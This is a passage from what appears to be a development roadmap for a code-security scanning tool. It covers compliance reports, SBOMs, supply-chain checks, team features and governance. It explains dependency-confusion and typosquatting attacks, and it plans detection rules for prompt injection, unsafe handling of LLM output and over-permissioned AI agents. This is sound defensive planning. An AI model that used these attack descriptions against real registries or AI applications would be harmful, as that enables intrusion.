  - Req 8.3 (strong authentication): JWT/OAuth misconfiguration findings
  - Req 10 (log and monitor): logging/monitoring gap findings
- [ ] `armur report pci --task <id>` — PCI-DSS compliance gap report with remediation guidance

#### 31.4 HIPAA Technical Safeguards

- [ ] Map findings to HIPAA §164.312 technical safeguard requirements:
  - §164.312(a)(2)(iv) Encryption and Decryption → crypto findings
  - §164.312(c)(2) Authentication → auth findings
  - §164.312(d) Person or Entity Authentication → JWT/auth misconfiguration
  - §164.312(e)(2)(ii) Encryption in transit → TLS/HTTPS misconfiguration findings
- [ ] `armur report hipaa --task <id>` — HIPAA technical safeguard gap report

#### 31.5 NIST SP 800-53 & SOC 2

- [ ] Build NIST SP 800-53 Rev 5 control → finding mapping for the most relevant controls (SA-11, SI-3, SC-28, IA-5, etc.)
- [ ] Build SOC 2 Trust Service Criteria → finding mapping (CC6.1, CC6.6, CC6.8, CC7.1, CC8.1)
- [ ] `armur report nist --task <id>` and `armur report soc2 --task <id>` compliance reports

---

### Sprint 32 — SBOM Generation & License Compliance

#### 32.1 SBOM Generation (CycloneDX + SPDX)

- [ ] **CycloneDX** SBOM generation for all supported ecosystems:
  - Use `cdxgen` (CycloneDX Generator — supports 20+ ecosystems):
    - Run: `cdxgen -t <type> -o sbom.json <dir>`
  - Output: `~/.armur/sboms/<task-id>.cdx.json`
  - Include all direct + transitive dependencies with PURLs
- [ ] **SPDX** SBOM generation:
  - Use `spdx-sbom-generator` or Trivy SPDX mode: `trivy fs --format spdx-json <dir>`
  - Output: `~/.armur/sboms/<task-id>.spdx.json`
- [ ] `armur sbom <target> --format cyclonedx|spdx` CLI command
- [ ] SBOM content includes: component name, version, PURL, license, supplier, checksum
- [ ] NTIA Minimum Elements compliance check: verify SBOM contains all required NTIA fields; report gaps
- [ ] **Dependency-Track** export: `armur sbom upload --dt-url <url> --project-id <id>` — push SBOM to a Dependency-Track instance

#### 32.2 License Detection & Compliance

- [ ] **licensee** integration (GitHub's license detection tool — identifies SPDX license IDs)
  - Run: `licensee detect <dir> --json`; extract license expressions per file/package
- [ ] **FOSSA-style license policy** in `.armur.yml`:
  ```yaml
  licenses:
    allowed:
      - MIT
      - Apache-2.0
      - BSD-2-Clause
      - BSD-3-Clause
      - ISC
    denied:
      - GPL-3.0-only       # copyleft — incompatible with proprietary products
      - AGPL-3.0-only      # network copyleft
      - SSPL-1.0           # server-side copyleft
    notice-required:
      - MPL-2.0            # weak copyleft — require attribution notice
  ```
- [ ] Flag each dependency with a denied license as a `license_violation` finding (severity: HIGH for copyleft)
- [ ] License compatibility matrix: detect GPL contamination — if any transitive dep is GPL, the entire dependency tree is tainted
- [ ] `armur licenses <target>` CLI command: print a table of all dependencies with their detected licenses
- [ ] Generate an attribution notice file (`NOTICES.txt`) for all permissive-license dependencies

---

### Sprint 33 — Supply Chain Security

#### 33.1 Dependency Confusion Detection

Dependency confusion attacks substitute a private package with a malicious public one by registering
the private package name on the public registry with a higher version number.

- [ ] Detect private package name patterns in manifests:
  - Scope packages (`@company/pkg`) in npm that also exist on the public registry
  - Internal PyPI package names that appear on public PyPI with a newer version
  - Go module paths that use internal domains but resolve via public GOPROXY
- [ ] For each internal package: check if the same name exists on the public registry (npm API, PyPI API)
- [ ] If found with a higher version on public registry: flag as `CRITICAL` dependency confusion risk
- [ ] Recommend mitigation: use `--registry` flags, npm `.npmrc` scope-to-registry mappings, or Artifactory

#### 33.2 Typosquatting Detection

- [ ] Maintain a list of top-1000 most-downloaded packages per ecosystem (npm, PyPI, RubyGems, crates.io)
- [ ] For each dependency in the scanned manifest: compute Levenshtein distance against the top-1000 list
- [ ] If distance == 1 and the package is not in the top-1000: flag as potential typosquat (severity: MEDIUM)
- [ ] False positive reduction: only flag packages with <1,000 total downloads or <1 year old on the registry

#### 33.3 Dependency Version Pinning Analysis

- [ ] Analyze lockfiles and manifests for version constraint security:
  - Flag semver ranges (`^1.0.0`, `~1.0.0`, `>=1.0.0`) as `INFO` — prefer exact pins for reproducibility
  - Flag unpinned indirect dependencies (manifest has `^1.0.0` but no lockfile committed)
  - Flag missing lockfile: manifest has dependencies but no lockfile in the repo
- [ ] **Renovate / Dependabot config detection**: check if automated dependency update tooling is configured; if not, flag as `INFO`

#### 33.4 Package Provenance & Signing

- [ ] **npm provenance** check: for npm packages, verify `provenance` attestation via npm CLI (`npm audit signatures`)
- [ ] **Sigstore/cosign** verification for Go modules: use `cosign verify-blob` for signed modules
- [ ] **PyPI Trusted Publishers** check: verify if critical PyPI packages use Trusted Publisher attestations
- [ ] Flag packages published from unverified sources as `INFO` findings

#### 33.5 Abandoned & Unmaintained Package Detection

- [ ] For each dependency: query the package registry API for:
  - Last release date (flag if > 2 years with no release)
  - Number of maintainers (flag if sole maintainer and account shows no recent activity)
  - Repository archived on GitHub (flag as abandoned)
- [ ] Severity mapping: actively abandoned + has known CVEs → HIGH; just abandoned → LOW; sole maintainer → INFO

---

## Phase 6: Enterprise (v4.0) — Sprints 34–39

Team features, scale, governance, threat intelligence, multi-tenant API, and LLM security.

---

### Sprint 34 — Team & Organization Features

#### 34.1 Multi-User API with RBAC

- [ ] Add user model to the server: `User { ID, Email, Role, APIKey, CreatedAt }`
- [ ] Roles: `admin` (full access), `editor` (run scans, manage findings), `viewer` (read-only)
- [ ] Admin API endpoints: `POST /api/v1/admin/users`, `DELETE /api/v1/admin/users/:id`, `PATCH /api/v1/admin/users/:id/role`
- [ ] API keys scoped to users: each user has their own API key for CLI authentication
- [ ] Findings are tagged with the user who submitted the scan

#### 34.2 Finding Assignment & Workflow

- [ ] Add `PATCH /api/v1/findings/:id` endpoint:
  - `assignee_email` — assign to a team member
  - `status` — `open` | `in_progress` | `resolved` | `suppressed` | `accepted_risk`
  - `comment` — free text note
- [ ] `armur finding assign <id> --to user@example.com` CLI command
- [ ] `armur finding status <id> --set resolved` CLI command
- [ ] Webhook notification when a finding is assigned

#### 34.3 Finding Suppression Management

- [ ] Inline suppression in source code: `// armur:ignore <rule-id> -- reason -- until:2026-12-31`
- [ ] Global suppression via `.armur.yml`:
  ```yaml
  suppress:
    - rule: "gosec.G401"
      path: "internal/crypto/legacy.go"
      reason: "Legacy code, scheduled for removal in Q2 2026"
      expires: "2026-06-01"
      approved-by: "jane@example.com"
  ```
- [ ] `armur suppress <finding-id>` interactive CLI: prompts for reason, expiry, approver
- [ ] Suppression audit trail: log who suppressed what, when, with what reason
- [ ] Expired suppressions automatically reactivate the finding on next scan
- [ ] `armur suppressions list` — show all active suppressions with expiry dates

#### 34.4 SSO Integration

- [ ] OIDC provider support (Google, GitHub, Okta, Auth0):
  - Config: `ARMUR_OIDC_ISSUER`, `ARMUR_OIDC_CLIENT_ID`, `ARMUR_OIDC_CLIENT_SECRET`
  - Exchange OIDC ID token for Armur API key on first login
- [ ] SAML 2.0 IdP integration for enterprise (Okta SAML, Azure AD SAML)
- [ ] `armur login --oidc` CLI command: opens browser for OIDC flow, stores token in `~/.armur/credentials`

#### 34.5 Organization-Level Audit Log

- [ ] Every scan submission, finding suppression, user creation, and role change creates an audit log entry
- [ ] `GET /api/v1/admin/audit-log` endpoint (admin-only): paginated audit log
- [ ] `armur audit-log --since 2026-01-01` CLI command to query the log
- [ ] Audit log entries include: timestamp, actor (user ID + email), action, resource ID, IP address

---

### Sprint 35 — Performance at Scale (Monorepos, Caching, Distributed Scanning)

#### 35.1 Monorepo Support

- [ ] **Service detection**: detect services/modules within a monorepo by finding multiple `go.mod`, `package.json`, `pom.xml`, `pyproject.toml` files
- [ ] **Per-service scanning**: scan each detected service independently in parallel; merge results with per-service labels
- [ ] `armur run --monorepo` flag: explicitly enable monorepo mode with per-service breakdown in TUI
- [ ] `armur run --service <name>` flag: scan only a specific named service within a monorepo
- [ ] Result grouping in TUI: top-level tabs by service name; summary card shows per-service severity counts

#### 35.2 Scan Result Caching

- [ ] **File-level caching**: compute SHA256 hash of each source file before scanning
  - If a file's hash matches a cache entry (stored in Redis), reuse cached tool results for that file
  - Only re-run tools on files that have changed since the last scan
  - Cache key: `cache:<repo-url>:<file-path>:<sha256>:<tool>`
- [ ] **Tool result caching**: cache the full tool output keyed by `(tool_version + dir_hash)`; TTL: 24h
- [ ] Cache invalidation: clear cache for a repo when any file in the repo changes
- [ ] Cache hit rate reported in scan metadata: `"cache": { "hit_rate": 0.73, "files_from_cache": 147 }`
- [ ] `armur cache clear` CLI command — flush all cached results

#### 35.3 Distributed Scanning (Multiple Workers)

- [ ] Asynq already supports multiple workers — document and test multi-worker deployment
- [ ] Add worker-aware task distribution: large repos split into sub-tasks (one per tool or one per service) for parallel execution across workers
- [ ] Worker health reporting: each worker registers itself in Redis with heartbeat TTL; `GET /api/v1/workers` endpoint lists active workers
- [ ] Priority queues: add `critical`, `default`, `low` Asynq queues; API key tier determines which queue tasks land in
- [ ] Worker auto-scaling hints: `/metrics` endpoint exposes queue depth; publish Kubernetes HPA custom metrics example

#### 35.4 Large Repo Optimizations

- [ ] Shallow clone by default: `git clone --depth=1` for repository scans (already fast; make explicit)
- [ ] Sparse checkout for monorepos: only check out the specific service directory when `--service` is specified
- [ ] File count limit with warning: if repo has > 50,000 files, warn and offer to scan only the top-level `--depth 3` directories
- [ ] Memory limit for tool execution: set `ulimit -v` (virtual memory cap) per tool subprocess to prevent OOM on oversized repos
- [ ] Incremental cache warm-up: on first scan, build file hash cache; subsequent scans are 5–10x faster

#### 35.5 Scan Queue Priority & Scheduling

- [ ] `POST /api/v1/scan/repo` accepts optional `priority: critical|high|normal|low` field
- [ ] Priority maps to Asynq queue: critical → immediately dequeued, low → background
- [ ] `scheduled_at` field: schedule a scan for a future time (e.g., nightly at 02:00)
- [ ] Recurring scan schedule: `cron: "0 2 * * *"` field in scan request — re-enqueues task on the given cron schedule
- [ ] `armur schedule add <target> --cron "0 2 * * *"` CLI command for recurring scans

---

### Sprint 36 — Governance: Verified Fixes, Regression Prevention & SLA Enforcement

Security fixes that silently reappear are a major enterprise pain point. This sprint makes Armur
into an active security guardian — not just a reporter — by verifying fixes, preventing regressions,
enforcing remediation timelines, tracking security debt, and managing suppressions.

#### 36.1 Verified Fix Workflow

When `armur fix --apply <id>` applies a patch, automatically re-scan to confirm the fix worked.

- [ ] After `armur fix --apply <finding-id>`:
  1. Apply the patch to the file
  2. Immediately re-scan only the patched file (`armur scan --file <path> --in-process`)
  3. Check if the original finding is gone
  4. Check if the patch introduced any new findings
  5. Report result:
     - "Finding resolved. No new issues introduced." → delete the original finding from history
     - "Finding still present. The patch may be incomplete." → show the re-scan result
     - "Finding resolved but 1 new issue introduced." → show the new finding
- [ ] Add `--verify` flag to `armur fix --apply --verify` to make verification explicit
- [ ] Verified fixes are marked with `Finding.Status = "verified_fixed"` in the history DB

#### 36.2 Security Regression Detection

A regression is when a previously-fixed finding reappears in a new scan.

- [ ] On each scan completion: compare findings against the previous scan for the same target
  - New findings (in current scan, not in previous): mark as `NEW` (shown in red in the TUI)
  - Regressed findings (fixed in a previous scan, back in current): mark as `REGRESSED` (shown in purple)
  - Resolved findings (in previous scan, not in current): mark as `FIXED` (shown in green)
  - Persistent findings (in both): mark as `OPEN`
- [ ] Regression findings are automatically promoted one severity level (a regressed MEDIUM becomes HIGH — regression implies the team ignored a fix)
- [ ] CI integration: `--fail-on-regression` flag — fail the CI build if any previously-fixed finding reappears
- [ ] `armur compare --regression <task-id>` — show only regressed findings between two scans

#### 36.3 "Never Allow" Rules (Hard Security Gates)

Some vulnerabilities must never appear in a codebase — ever. Armur should enforce this as a
hard gate, distinct from severity thresholds.

- [ ] `.armur.yml` `never-allow` configuration:
  ```yaml
  never-allow:
    - rule: "gosec.G401"      # MD5 usage — never acceptable
      message: "MD5 is cryptographically broken. Use SHA-256 or better."
    - cwe: "CWE-89"           # SQL injection — never acceptable
    - category: "secret_detection"  # hardcoded secrets — never acceptable
    - tool: "trufflehog"      # any trufflehog finding
  ```
- [ ] If a `never-allow` finding is detected: exit code 2 (distinct from the normal exit code 1 for threshold violations)
- [ ] In CI: `never-allow` violations block merge regardless of PR author permissions — this is a hard gate
- [ ] `armur never-allow add <rule-id>` — add a rule to the never-allow list interactively
- [ ] Display `never-allow` violations at the top of all results with a `[BLOCKED]` badge

#### 36.4 SLA Tracking & Enforcement

Security findings have deadlines. Tracking whether teams meet them is essential for compliance.

- [ ] Define SLA policies in `.armur.yml` or via the web dashboard:
  ```yaml
  sla:
    critical: 1d      # 1 business day
    high: 7d          # 7 calendar days
    medium: 30d       # 30 calendar days
    low: 90d          # 90 calendar days
    info: 180d        # 6 months
  ```
- [ ] When a finding first appears: record `Finding.DetectedAt` timestamp in the history DB
- [ ] On each subsequent scan: compute `days_open = now - detected_at`; compare to SLA
- [ ] SLA breach: finding is past its deadline → mark as `SLA_BREACHED`, promote severity by one level
- [ ] SLA warning: finding is within 20% of its deadline → mark as `SLA_WARNING`
- [ ] `armur sla report` — print a table of all open findings with days remaining / days overdue
- [ ] SLA breach notifications: Slack/Teams/email alert when a finding enters SLA_BREACHED state
- [ ] SLA compliance rate: `armur sla stats` — "72% of HIGH findings were fixed within SLA in the last 90 days"
- [ ] Include SLA compliance rate in the executive PDF report

#### 36.5 Composite Risk Score per Finding

- [ ] Add `RiskScore float64` field to the `Finding` struct
- [ ] Compute in `internal/analysis/risk.go` after all tool results are merged:
  ```
  RiskScore = BaseScore
            × ExploitabilityMultiplier   (1.5 if CISA KEV, 1.2 if EPSS > 0.3, 1.0 otherwise)
            × AssetCriticalityMultiplier (1.5 if "critical", 1.2 if "high", 1.0 if "medium", 0.7 if "low")
            × ReachabilityMultiplier     (1.5 if reachable, 1.0 if unknown, 0.5 if unreachable)
  ```
- [ ] BaseScore: CRITICAL=10, HIGH=7, MEDIUM=4, LOW=1, INFO=0.1
- [ ] Asset criticality read from `.armur.yml: asset-criticality: high`
- [ ] Default sort in TUI results browser changed to `RiskScore DESC` (from raw severity)

#### 36.6 Security Debt Tracker

Security debt is the accumulation of known issues that have been deferred. Quantifying it helps
teams prioritize and helps management understand risk.

- [ ] Compute security debt score: `debt = sum(severity_weight x days_open)` for all open findings
  - CRITICAL x 20 per day, HIGH x 10 per day, MEDIUM x 3 per day, LOW x 1 per day
- [ ] `armur debt` — print the current security debt score + trend (increasing/decreasing)
- [ ] Display security debt trend in the HTML report: sparkline of debt score over last 30 scans
- [ ] "Debt payoff planner": given the current team velocity (avg fixes per sprint), estimate how many sprints to reach zero critical debt
- [ ] Alert when security debt score increases by > 20% in a single week (sudden new vulnerabilities introduced)

#### 36.7 Finding Suppression System

- [ ] `armur suppress <finding-id> --reason "false positive" --expires 2026-12-31` command
- [ ] Store suppressions in SQLite:
  ```sql
  CREATE TABLE IF NOT EXISTS suppressions (
      finding_id   TEXT PRIMARY KEY,
      reason       TEXT NOT NULL,
      suppressed_by TEXT,
      suppressed_at DATETIME,
      expires_at   DATETIME
  );
  ```
- [ ] Inline suppression in source code: `// armur:ignore <rule-id>` or `# armur:ignore <rule-id>` parsed during scan; matching findings marked as suppressed
- [ ] Expired suppressions auto-resurface on next scan (check `expires_at < now()`)
- [ ] `armur suppressions list` — show all active suppressions with expiry dates
- [ ] Suppressed findings counted separately in output: `17 findings (3 suppressed, not shown)`

#### 36.8 Executive Posture Report (PDF)

- [ ] `armur report executive --task <id>` — multi-page PDF using `signintech/gopdf`:
  1. Cover page: target, scan date, posture score (large), grade letter
  2. Executive Summary: key metrics, top 3 risk drivers, trend vs previous scan
  3. Severity breakdown (ASCII-art bar chart embedded in PDF)
  4. SLA compliance: % of findings within SLA by severity tier
  5. Security debt: current debt in hours with trend
  6. Top 10 findings by risk score (one per row: file, description, risk score, SLA deadline)
  7. Recommended actions: prioritized list ordered by risk score
- [ ] `armur report executive --format pdf` — explicitly request PDF; default is Markdown if no flag

---

### Sprint 37 — Threat Intelligence: OpenSSF Scorecard, CISA KEV, EPSS & SLSA

#### 37.1 OpenSSF Scorecard Integration

The OpenSSF Scorecard assesses project-level security hygiene — things no SAST/SCA tool checks:
branch protection, signed releases, dependency update automation, CI security, etc.

- [ ] **Scorecard CLI** integration: `scorecard --repo <url> --format json`
  - Run against the repository URL (not the local directory)
  - Parse `checks` array: each check has a `name`, `score` (0-10), and `reason`
  - Map checks with score < 5 to findings in a new `security_hygiene` category:
    - `Branch-Protection` score < 5 → HIGH: "Default branch has no protection rules"
    - `Signed-Releases` score < 5 → MEDIUM: "Releases are not cryptographically signed"
    - `Dependency-Update-Tool` score < 5 → MEDIUM: "No automated dependency updates configured (Dependabot/Renovate)"
    - `Token-Permissions` score < 5 → HIGH: "GitHub Actions workflows use excessive token permissions"
    - `Dangerous-Workflow` score < 1 → CRITICAL: "Dangerous CI workflow patterns detected (script injection, untrusted checkout)"
    - `Maintained` score < 1 → INFO: "Project appears unmaintained (no activity in 90 days)"
    - `Pinned-Dependencies` score < 5 → MEDIUM: "CI workflow dependencies are not pinned to commit hashes"
    - `Security-Policy` score < 5 → LOW: "No SECURITY.md or security policy found"
    - `Fuzzing` score < 5 → INFO: "No fuzzing integration found"
    - `SAST` score < 5 → INFO: "No SAST tool detected in CI (but you're using Armur, so fix this!)"
- [ ] Scorecard findings appear in the main results browser under a "Security Hygiene" tab
- [ ] `armur scorecard <repo-url>` — run Scorecard check standalone; print scored checklist
- [ ] Include Scorecard score in the posture score calculation: `final_score = 0.7 x finding_score + 0.3 x scorecard_score`
- [ ] Also run scorecard against top 10 direct dependencies: "Your dependency X has scorecard score 2/10"

#### 37.2 CISA KEV (Known Exploited Vulnerabilities) Enrichment

The CISA KEV catalog lists CVEs that are being **actively exploited in the wild right now**.
A KEV match is far more urgent than a theoretical CVE with a high CVSS score.

- [ ] Fetch CISA KEV catalog: `GET https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json`
  - Cache locally in `~/.armur/cisa-kev.json`; refresh every 6 hours (or daily in offline mode)
  - Catalog contains ~1,200 CVEs (growing) with due dates and affected products
- [ ] During SCA scanning: check every detected CVE against the KEV catalog
  - If match found: upgrade severity to `CRITICAL` regardless of CVSS score
  - Add `Finding.InCISAKEV = true` field
  - Add `Finding.CISADueDate` — the remediation due date CISA recommends for federal agencies
  - Message: "ACTIVELY EXPLOITED — This CVE is in the CISA Known Exploited Vulnerabilities catalog. Treat as P0."
- [ ] Display KEV findings with a special `[KEV]` badge in the TUI and HTML report
- [ ] `armur db update --kev` — force-refresh the KEV catalog immediately
- [ ] `armur report kev --task <id>` — show only KEV findings with their CISA remediation deadlines

#### 37.3 EPSS (Exploit Prediction Scoring System) Integration

EPSS is a probability score (0–100%) predicting how likely a CVE is to be exploited in the next 30 days.

- [ ] Fetch EPSS scores from the FIRST.org API: `GET https://api.first.org/data/1.0/epss?cve=CVE-XXXX`
- [ ] Add `Finding.EPSSScore float64` (0.0–1.0) to SCA findings
- [ ] Use EPSS in risk score calculation: `risk = cvss_score x (1 + epss_score) x reachability_multiplier`
- [ ] Display EPSS as a percentage in the results table: "EPSS: 73% (high exploitation probability)"
- [ ] Sort SCA findings by EPSS score by default (highest exploitation probability first)
- [ ] Batch EPSS queries: collect all CVE IDs from the scan, send one HTTP request per batch of 30

#### 37.4 VEX (Vulnerability Exploitability eXchange) Support

- [ ] Consume VEX documents: if `<project>.openvex.json` exists in the repo root, parse it and mark CVEs with `status: "not_affected"` or `status: "fixed"` as suppressed in SCA results
- [ ] Generate VEX documents: `armur vex generate --task <id>` — creates `openvex.json` with all SCA findings mapped to OpenVEX statements (status defaults to `"under_investigation"`)
- [ ] VEX format: OpenVEX (CISA standard — simple JSON, no library needed beyond `encoding/json`)
- [ ] Store generated VEX documents at `~/.armur/vex/<project-id>.openvex.json`

#### 37.5 SLSA Compliance Checking

SLSA (Supply-chain Levels for Software Artifacts) is a framework for supply chain integrity.

- [ ] Check SLSA Level 1 requirements for the scanned repository:
  - Scripted build (CI system detected) → check
  - Provenance generated (goreleaser with cosign signing detected) → check
  - Signed commits (GPG/SSH commit signing) → check `.gitconfig` or GitHub commit signature status
- [ ] Check SLSA Level 2: hosted build platform + authenticated provenance
- [ ] Check SLSA Level 3: provenance is signed (Sigstore/cosign artifacts in release) + no self-hosted runners
- [ ] Check SLSA Level 4: hermetic builds (Bazel/Nix reproducible builds)
- [ ] Report SLSA level achieved and gaps to reach next level
- [ ] `armur slsa --repo <url>` — dedicated SLSA assessment command
- [ ] Include SLSA level in the executive PDF report

#### 37.6 OSS-Fuzz Coverage Check

- [ ] Query GitHub API to check if any direct dependency is an OSS-Fuzz integrated project
- [ ] Cache the project list in Redis (1-hour TTL)
- [ ] For each direct dependency NOT in OSS-Fuzz: emit `INFO` finding: "Dependency has no continuous fuzzing coverage"
- [ ] For dependencies that ARE in OSS-Fuzz: add a positive note in the SCA section

---

### Sprint 38 — Multi-Tenant Enterprise API (Org, RBAC, Audit Log)

Built on top of the existing Gin + Redis stack. OIDC via `coreos/go-oidc` (well-established Go library).

#### 38.1 Organization & Project Data Model

- [ ] Extend Redis schema with org and project namespaces:
  - `org:<org-id>:info` — org metadata (name, created_at, owner)
  - `org:<org-id>:projects` — set of project IDs
  - `project:<project-id>:info` — project metadata (name, repo_url, org_id)
  - `project:<project-id>:scans` — sorted set of scan IDs by timestamp
- [ ] API endpoints:
  - `POST /api/v1/orgs` — create org (returns `org_id`)
  - `GET /api/v1/orgs/:id` — get org info
  - `POST /api/v1/orgs/:id/projects` — create project
  - `GET /api/v1/orgs/:id/projects` — list projects
  - `GET /api/v1/orgs/:id/findings` — aggregate findings across all projects
  - `GET /api/v1/orgs/:id/posture` — org-wide posture score

#### 38.2 Role-Based Access Control (RBAC)

- [ ] Roles: `org_admin`, `project_admin`, `developer`, `viewer`
- [ ] Store user roles in Redis: `user:<api-key>:role` → `org_admin`
- [ ] Add `RBACMiddleware` to Gin: reads API key from `Authorization` header, looks up role, enforces permissions per endpoint
- [ ] Permission matrix:
  - `org_admin`: all endpoints
  - `project_admin`: project scan + findings + suppressions; no user management
  - `developer`: trigger scans, view findings, create suppressions
  - `viewer`: GET endpoints only, no scan trigger

#### 38.3 OIDC Single Sign-On

- [ ] Add `coreos/go-oidc` dependency
- [ ] Config: `ARMUR_OIDC_ISSUER`, `ARMUR_OIDC_CLIENT_ID`, `ARMUR_OIDC_CLIENT_SECRET` env vars
- [ ] `GET /api/v1/auth/oidc/login` — redirect to IdP (Google, Okta, GitHub, Auth0)
- [ ] `GET /api/v1/auth/oidc/callback` — exchange code for tokens, create/update user record, return Armur API key
- [ ] `armur login --oidc` CLI command: open browser for OIDC flow, store API key in `~/.armur/credentials`
- [ ] Supported IdPs documented: Google, GitHub OAuth App, Okta, Auth0

#### 38.4 Organization-Level Audit Log

- [ ] Store audit log entries in Redis sorted set: `org:<org-id>:audit-log` (scored by timestamp)
- [ ] Log every state-changing action: scan submitted, finding suppressed, user role changed, project created/deleted
- [ ] Each entry: `{ ts, actor_id, actor_email, action, resource_type, resource_id, ip_address }`
- [ ] `GET /api/v1/orgs/:id/audit-log` — paginated audit log (admin-only)
- [ ] `armur audit-log --since 2026-01-01` CLI command

#### 38.5 Org-Level Aggregate Analytics

- [ ] `armur org posture` CLI command — show org-wide posture score aggregated across all projects
- [ ] `armur org findings --severity critical` — list all critical findings across all org projects
- [ ] API: `GET /api/v1/orgs/:id/posture` returns:
  ```json
  {
    "score": 73, "grade": "C",
    "projects": [{"name": "api-server", "score": 82}, {"name": "frontend", "score": 61}],
    "total_findings": {"critical": 2, "high": 14, "medium": 31, "low": 58}
  }
  ```

---

### Sprint 39 — AI/LLM Application Security (OWASP LLM Top 10)

All checks implemented as Semgrep rule packs + a small Go wrapper. Same implementation pattern
as all existing SAST tool integrations.

#### 39.1 LLM SDK Detection

- [ ] Implement `internal/tools/llmsecurity.go`
- [ ] Detect LLM SDK usage by scanning imports:
  - Go: `github.com/anthropics/anthropic-sdk-go`, `github.com/sashabaranov/go-openai`
  - Python: `import anthropic`, `import openai`, `from langchain`, `from llama_index`
  - JavaScript: `import Anthropic`, `require('openai')`, `from 'langchain'`
- [ ] If no LLM SDK detected: skip this tool entirely (zero false positives for non-AI codebases)

#### 39.2 Prompt Injection Detection (LLM01)

- [ ] Semgrep rules in `configs/semgrep/llm-security/prompt-injection.yaml`:
  - Python: f-string or `.format()` with user input variable directly concatenated into a prompt variable that is then passed to an LLM client completion call
  - JavaScript: template literal with user input directly in a `messages` array passed to `.create()`
  - Go: `fmt.Sprintf` with user input inside a string passed to the Anthropic/OpenAI SDK
- [ ] Taint: source = HTTP request body / query param / form field; sink = LLM completion call argument
- [ ] Finding message: `"User input directly interpolated into LLM prompt — prompt injection risk (OWASP LLM01)"`

#### 39.3 Insecure Output Handling (LLM02)

- [ ] Semgrep rules in `configs/semgrep/llm-security/output-handling.yaml`:
  - LLM response content passed directly to `eval()` / `exec()` / `subprocess.run()` → CRITICAL
  - LLM response rendered as raw HTML without `html.EscapeString()` or template auto-escaping → HIGH
  - LLM response used as a SQL query fragment → CRITICAL
  - LLM response written to a filesystem path without sanitization → HIGH

#### 39.4 Excessive Agency Detection (LLM08)

- [ ] Detect tool/function definitions in agentic LLM code:
  - Python: `tools=[{"name": ..., "function": ...}]` or LangChain `Tool` definitions
  - TypeScript: `tools: [{type: "function", function: {...}}]` in OpenAI tool arrays
- [ ] Flag tool definitions that combine: filesystem write + network access + code execution in a single agent without human-in-the-loop confirmation logic
- [ ] Flag: database write tools (`INSERT`, `UPDATE`, `DELETE`) with no human approval step

#### 39.5 OWASP LLM Top 10 Mapping & Report

- [ ] Build `internal/compliance/owasp_llm.go` mapping table:
  - LLM01 Prompt Injection → prompt injection findings
  - LLM02 Insecure Output Handling → output handling findings
  - LLM06 Sensitive Information Disclosure → PII in prompt context
  - LLM08 Excessive Agency → agency detection findings
  - LLM09 Overreliance → missing fallback/error handling when LLM API fails
- [ ] Add `Finding.OWASPLLM string` field (e.g., `"LLM01:2025"`)
- [ ] `armur report llm --task <id>` — LLM security report
- [ ] `armur llm-security <target>` — dedicated scan mode that runs only LLM security checks

---

## Backlog (Demand-Driven)

Features below are not scheduled. They will be prioritized based on user demand and community feedback.

- **Observability** (old Sprint 6): Prometheus metrics, health checks, OpenTelemetry tracing, Grafana dashboard
- **SSE Architecture** (old Sprint 9): SSE endpoint for real-time per-tool progress, worker progress instrumentation, CLI SSE client with reconnect
- **API Improvements** (old Sprint 14): Typed API response structs, batch scanning API, webhook notifications, request correlation IDs
- **Language Expansion Tier 1** (old Sprint 16): Java/Kotlin (SpotBugs, PMD, OWASP Dep-Check, Error Prone), C#/.NET (Security Code Scan, Puma Scan, dotnet-retire), Rust extras (cargo-deny, cargo-geiger, clippy)
- **Language Expansion Tier 2** (old Sprint 17): PHP (PHPCS, Psalm, PHP Security Checker), Ruby (Brakeman, bundler-audit, RuboCop), Swift (SwiftLint, Periphery), Shell/Bash/PowerShell (ShellCheck, bashate, PSScriptAnalyzer)
- **Language Expansion Tier 3** (old Sprint 18): Scala (Scalafix, WartRemover), Elixir (Sobelow, Credo), Dart/Flutter (dart analyze), Go extras (govulncheck, errcheck, ineffassign, shadow)
- **Web3/Blockchain Deep** (old Sprint 19): Solidity (Slither, Mythril, solhint), Vyper, Move, Cairo, Rust WASM contracts
- **IaC Cloud Providers** (old Sprint 20): Terraform (tfsec, terrascan, infracost), CloudFormation (cfn-lint, cfn-nag), CDK (cdk-nag), Pulumi, Azure ARM/Bicep, GCP Deployment Manager
- **IaC Kubernetes & Config Mgmt** (old Sprint 21): kube-linter, kube-score, kubesec, Polaris, Helm, Docker Compose, Ansible, Puppet/Chef, Hadolint
- **Container Image Security** (old Sprint 22): Trivy image mode, Grype, layer analysis, base image assessment, SBOM extraction from images
- **Rules Marketplace** (old Sprint 31): Community rules registry, armur rules CLI, custom rule authoring, import from Semgrep/Snyk
- **Slack/Teams/Issue Trackers** (old Sprint 41): Slack app, Teams connector, Jira auto-create, Linear integration, GitHub Issues, PagerDuty alerting
- **Security Badges & Social Proof** (old Sprint 42): Dynamic score badge, public scan results page, security leaderboard, README generator
- **Armur Cloud SaaS** (old Sprint 43): Hosted infrastructure, web dashboard, GitHub/GitLab OAuth, Cloud API, pricing tiers
- **Community & Growth** (old Sprint 45): armur.ai website, docs site, YouTube, Discord, contributor program, bounty program, "Scan Open Source" program
- **Mobile Security** (old Sprint 49): MobSF integration, apkleaks, jadx, iOS analysis, certificate pinning checks, OWASP MASVS reporting
- **Fuzzing** (old Sprint 52): Go native fuzzing, Python (Atheris), JavaScript (jsfuzz), armur fuzz command
- **Privacy & PII** (old Sprint 53): PII pattern detection, database schema PII, API response PII, GDPR/CCPA compliance mapping
- **Crypto Health** (old Sprint 54): TLS config analysis, algorithm strength checks, certificate analysis, post-quantum readiness
- **Binary Security** (old Sprint 55): checksec integration, hardcoded strings in binaries, Go binary dependency extraction, SBOM from binaries
- **Threat Modeling** (old Sprint 56): HTTP route detection via Semgrep, DFD generation (Mermaid), STRIDE analysis, attack surface report
- **Gamification** (old Sprint 57): Developer security score (git blame), armur learn lessons, fix streak tracking, challenge mode
- **Dep Auto-Fix PRs** (old Sprint 58): Safe dependency bump engine, GitHub/GitLab PR creation, PR policy config, pre-bump safety scan
- **Network/Protocol Config** (old Sprint 60): Web server TLS analysis, HTTP security headers, Istio/service mesh, Protobuf/gRPC, Kubernetes Ingress/NetworkPolicy
- **Security Test Generation** (old Sprint 61): Failing test generation from findings, PoC payload library, regression test suite, fuzz harness generation
- **Forensic Mode** (old Sprint 63): Repository history forensics, backdoor pattern detection, unauthorized change detection, malicious install hooks

---

*Last updated: March 2026*
